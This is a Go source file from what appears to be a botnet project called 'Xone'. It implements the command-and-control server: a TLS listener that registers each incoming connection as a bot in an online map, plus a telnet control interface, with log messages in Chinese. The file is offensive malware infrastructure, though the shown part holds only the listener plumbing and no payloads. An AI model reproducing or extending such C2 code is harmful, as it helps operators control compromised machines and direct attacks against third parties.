package cnc

import (
	"Xone/utils"
	"crypto/tls"
	"fmt"
	"os"
	"strings"
)

func NewServer() *CNC {
	s := &CNC{
		ListenAddr:     utils.GlobalObject.ServerAddr,
		ListenPort:     utils.GlobalObject.ServerPort,
		ServerProtocol: "tcp",
		OnlineMap:      make(map[string]*BotInfo),

		exec: make(chan string),
	}

	return s
}

func (s *CNC) Listen() {

	config := &tls.Config{
		Certificates: []tls.Certificate{func() tls.Certificate {
			cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
			if err != nil {
				fmt.Println("[-]证书错误 -->", err)
				os.Exit(1)
			}
			return cert
		}()},
	}
	listen, err := tls.Listen(s.ServerProtocol, fmt.Sprintf(s.ListenAddr+":"+s.ListenPort), config)
	if err != nil {
		fmt.Println("[-]开启监听失败 -->", err)
	}
	fmt.Println("[*]Xone服务启动成功监听地址 -->", listen.Addr())
	go NewTelnetServer(s).TelnetListen()
	for {
		conn, err := listen.Accept()
		if err != nil {
			continue
		}
		ok := strings.Split(conn.RemoteAddr().String(), ":")[0]
		bot := NewBot(conn, ok, s)
		go bot.startConnection()

	}
}
func (s *CNC) Stop() {

}

func (s *CNC) Start() {
	go s.Listen()

	select {}
}
